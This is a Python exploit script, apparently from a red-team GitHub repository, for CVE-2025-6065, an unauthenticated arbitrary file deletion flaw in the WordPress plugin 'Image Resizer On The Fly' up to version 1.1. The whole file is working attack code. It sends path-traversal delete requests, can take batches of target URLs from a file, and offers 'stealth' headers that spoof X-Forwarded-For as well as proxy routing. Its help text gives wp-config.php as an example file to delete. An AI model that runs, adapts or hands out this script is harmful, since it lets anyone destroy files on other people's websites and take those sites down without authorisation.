#!/usr/bin/env python3
# github.com/Yuri08loveElaina | Red Team Pro Edition
# Exploit for CVE-2025-6065 - Arbitrary File Deletion in WordPress Plugin
# Plugin: Image Resizer On The Fly <= 1.1
# Coder by Yuri08 | RuptureFarm 1029 | ELAINA CORE

import requests
import argparse
import urllib3
import json
from urllib.parse import urljoin, quote

urllib3.disable_warnings()

SIGNATURE = "github.com/Yuri08loveElaina"

headers_stealth = {
    "User-Agent": "Mozilla/5.0",
    "X-Forwarded-For": "127.0.0.1"
}

def banner():
    print(f"""
\033[1;91m   ______      __      __               ______                        __  
  / ____/__  _/ /___ _/ /____  _____   / ____/___  ____ ___  ___     / /__
 / / __/ _ \/ / __ `/ __/ _ \/ ___/  / /   / __ \/ __ `__ \/ _ \   / / _ \
/ /_/ /  __/ / /_/ / /_/  __/ /     / /___/ /_/ / / / / / /  __/  / /  __/
\____/\___/_/\__,_/\__/\___/_/      \____/\____/_/ /_/ /_/\___/  /_/\___/ 
\033[1;94mCVE-2025-6065 - Arbitrary File Deletion (Unauthenticated)\033[0m
{SIGNATURE} | Exploit module
    """)

def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    return url.rstrip("/")

def send_delete_payload(target, filename, stealth=False, proxy=None):
    target = validate_url(target)
    payload = f"/wp-content/plugins/image-resizer-on-the-fly/image-resizer-on-the-fly.php?task=delete&img=../../../../{quote(filename)}"
    url = urljoin(target, payload)
    
    session = requests.Session()
    if stealth:
        session.headers.update(headers_stealth)

    try:
        r = session.get(url, verify=False, timeout=10, proxies={"http": proxy, "https": proxy} if proxy else None)
        if r.status_code == 200:
            return {"target": target, "status": "OK", "deleted": filename}
        else:
            return {"target": target, "status": "Failed", "code": r.status_code}
    except Exception as e:
        return {"target": target, "status": "Error", "error": str(e)}

def check_only(target):
    target = validate_url(target)
    url = urljoin(target, "/wp-content/plugins/image-resizer-on-the-fly/image-resizer-on-the-fly.php")
    try:
        r = requests.get(url, verify=False, timeout=8)
        return r.status_code == 200
    except:
        return False

def batch_mode(file_path):
    with open(file_path, "r") as f:
        return [validate_url(line.strip()) for line in f if line.strip()]

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL")
    parser.add_argument("--file", help="Scan list of targets (targets.txt)")
    parser.add_argument("--cmd", help="Delete file path (e.g. wp-config.php)")
    parser.add_argument("--stealth", action="store_true", help="Use stealth headers")
    parser.add_argument("--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--check-only", action="store_true", help="Only check plugin presence")
    parser.add_argument("--json-output", help="Write result to file")
    args = parser.parse_args()

    results = []

    targets = []
    if args.url:
        targets.append(args.url)
    elif args.file:
        targets = batch_mode(args.file)
    else:
        print("[!] Provide --url or --file")
        return

    for target in targets:
        if args.check_only:
            found = check_only(target)
            status = "FOUND" if found else "NOT FOUND"
            print(f"[CHECK] {target} -> {status}")
            results.append({"target": target, "plugin_found": found})
        elif args.cmd:
            result = send_delete_payload(target, args.cmd, args.stealth, args.proxy)
            print(f"[DEL] {target} -> {result['status']}")
            results.append(result)
        else:
            print("[!] Provide --cmd or --check-only")

    if args.json_output:
        with open(args.json_output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Output written to {args.json_output}")

if __name__ == "__main__":
    main()
